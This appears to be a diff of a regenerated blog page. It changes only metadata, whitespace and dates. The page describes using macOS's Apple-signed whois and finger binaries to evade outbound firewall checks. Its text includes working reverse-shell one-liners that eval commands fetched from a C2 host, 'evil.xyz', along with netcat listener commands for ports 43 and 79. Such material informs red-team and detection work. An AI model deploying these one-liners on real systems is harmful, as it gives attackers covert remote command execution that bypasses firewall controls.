@@ -19,8 +19,8 @@ The Whois protocol The whois protocol is very simple TCP-based query/response pr
 The Whois protocol The whois protocol is very simple TCP-based query/response protocol." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/whois-and-finger-reverse-shell/" />
-<meta property="article:published_time" content="2018-09-01T00:00:00&#43;00:00"/>
-<meta property="article:modified_time" content="2018-09-01T00:00:00&#43;00:00"/>
+<meta property="article:published_time" content="2018-09-01T00:00:00+00:00" />
+<meta property="article:modified_time" content="2018-09-01T00:00:00+00:00" />
 
 
     
@@ -55,7 +55,7 @@ The Whois protocol The whois protocol is very simple TCP-based query/response pr
     <link rel="icon" type="image/png" href="../../images/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="../../images/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.54.0" />
+    <meta name="generator" content="Hugo 0.80.0" />
   </head>
 
   <body class=" ">
@@ -117,23 +117,17 @@ The Whois protocol The whois protocol is very simple TCP-based query/response pr
       </header>
 
       <div>
-        
-
-<h1 id="introduction">Introduction</h1>
-
+        <h1 id="introduction">Introduction</h1>
 <p>In the presentation <a href="https://speakerdeck.com/patrickwardle/fire-and-ice-making-and-breaking-macos-firewalls?slide=24">Fire &amp; Ice: Making and Breaking macOS Firewalls,</a>
 <a href="https://twitter.com/patrickwardle">Patrick Wardle</a> mentioned the idea of using binaries signed by Apple
 to by-pass firewall checks for outbound traffic. As an example, he mentioned
 <code>whois</code>. I thought it would be interesting to throw together a one-liner reverse
 shell that uses <code>whois</code> to do the socket handling. In addition to <code>whois</code>, what
 other system utilities can be used.</p>
-
 <h1 id="the-whois-protocol">The Whois protocol</h1>
-
 <p>The whois protocol is very simple TCP-based query/response protocol. Everything
 is sent as plain-text and by default, port 43 is used. An example request is
 shown below:</p>
-
 <pre><code>   client                           server at whois.nic.mil
    open TCP   ---- (SYN) ------------------------------&gt;
               &lt;---- (SYN+ACK) --------------------------
@@ -142,18 +136,13 @@ shown below:</p>
               &lt;---- &quot;More info about Smith&lt;CR&gt;&lt;LF&gt;&quot; ----
    close      &lt;---- (FIN) ------------------------------
               ----- (FIN) ----------------------------&gt;
-</code></pre>
-
-<p>The client sends a query to the server. The query ends with a <code>\r\n</code>. The server
+</code></pre><p>The client sends a query to the server. The query ends with a <code>\r\n</code>. The server
 sends the response back to the client. The response can contain multiple lines
 that are indicated with the line ending characters <code>\r\n</code>. The server signals to
 the client of the end of the response by closing the socket.</p>
-
-<h1 id="macos-s-whois-binary">macOS&rsquo;s Whois binary</h1>
-
+<h1 id="macoss-whois-binary">macOS&rsquo;s Whois binary</h1>
 <p>The whois binary on macOS is signed by Apple, so it might be possible to use
 the binary to by-pass whitelisting restrictions.</p>
-
 <pre><code>$ codesign -dvvvv /usr/bin/whois
 Executable=/usr/bin/whois
 Identifier=com.apple.whois
@@ -176,81 +165,50 @@ Info.plist=not bound
 TeamIdentifier=not set
 Sealed Resources=none
 Internal requirements count=1 size=64
-</code></pre>
-
-<h1 id="reverse-shell-using-whois">Reverse shell using whois</h1>
-
+</code></pre><h1 id="reverse-shell-using-whois">Reverse shell using whois</h1>
 <h2 id="client">Client</h2>
-
 <p>Due to restrictions with the protocol, we can&rsquo;t open a bidirectional stream.
 Instead, we need to capture the data in a variable so we have access to it
 when we invoke <code>whois</code>. The idea is as follow:</p>
-
 <ol>
 <li>Send a request to the server.</li>
 <li>Evaluate the command received by the server.</li>
 <li>Capture the input so we can send it to the server via another whois request.</li>
 </ol>
-
 <p>We also have to ensure some data is always sent to the server when <code>whois</code> is
 invoked. Otherwise, an error is returned.</p>
-
 <p>Putting it all together you get the following line to connect to a C2 server
 listing at <code>evil.xyz</code>:</p>
-
 <pre><code>export X=Connected; while true; do X=`eval $(whois -h evil.xyz -- &quot;Output: $X&quot;)`; sleep 1; done
-</code></pre>
-
-<h2 id="server">Server</h2>
-
+</code></pre><h2 id="server">Server</h2>
 <p>On the server-side we can just use netcat as a POC implementation:</p>
-
 <pre><code>while true; do nc -l 43; done
-</code></pre>
-
-<p>Netcat runs in a while loop because we need to close the socket to signal
+</code></pre><p>Netcat runs in a while loop because we need to close the socket to signal
 the end of each command. Once a client has connected, type a command followed
 by pressing <code>enter</code> and <code>Ctrl+d</code> to close <code>STDIN</code>. When <code>STDIN</code> is closed,
 netcat closes the socket and exits.</p>
-
 <h1 id="use-finger-instead-of-whois">Use finger instead of whois</h1>
-
 <p>A default install of macOS also includes <code>finger</code> what can be used to send
 and receive data from a server.</p>
-
 <h2 id="the-finger-protocol">The finger protocol</h2>
-
 <p>For our purpose, the finger protocol is very similar to the whois protocol.
 It&rsquo;s query based over TCP. It uses port 79 by default.</p>
-
 <h1 id="reverse-shell-using-finger">Reverse shell using finger</h1>
-
 <h2 id="client-1">Client</h2>
-
 <p>We can use the similar structure as the client line for whois. The finger
 implementation for macOS prints some status messages to <code>STDOUT</code> so some
 grep/sed is needed to filter out the command sent from the server.</p>
-
 <p>Client line for connecting to a C2 located at <code>evil.xyz</code>:</p>
-
 <pre><code>export X=Connected; while true; do X=`eval $(finger &quot;$X&quot;@evil.xyz 2&gt; /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
-</code></pre>
-
-<h2 id="server-1">Server</h2>
-
+</code></pre><h2 id="server-1">Server</h2>
 <p>The server is similar to the <code>whois</code> server:</p>
-
 <pre><code>while true; do nc -l 79; done
-</code></pre>
-
-<p>When sending a command to the client, we need to indicate where it starts
+</code></pre><p>When sending a command to the client, we need to indicate where it starts
 and where it ends. The client line above expecting the command line to
 start with <code>!</code>. The end of the command is signaled by closing the socket
 by pressing <code>Ctrl+d</code>. For example to list the temp directory, type <code>!ls /tmp</code>
 followed by an enter press and <code>Ctrl+d</code>.</p>
-
 <h1 id="links">Links</h1>
-
 <ul>
 <li><a href="https://tools.ietf.org/html/rfc3912">Whois RFC3912</a></li>
 <li><a href="https://tools.ietf.org/html/rfc1196">Finger RFC1196</a></li>
@@ -276,7 +234,7 @@ followed by an enter press and <code>Ctrl+d</code>.</p>
     
       <p>All rights reserved</p>
     
-     © 2020
+     © 2021
     
     
   </section>
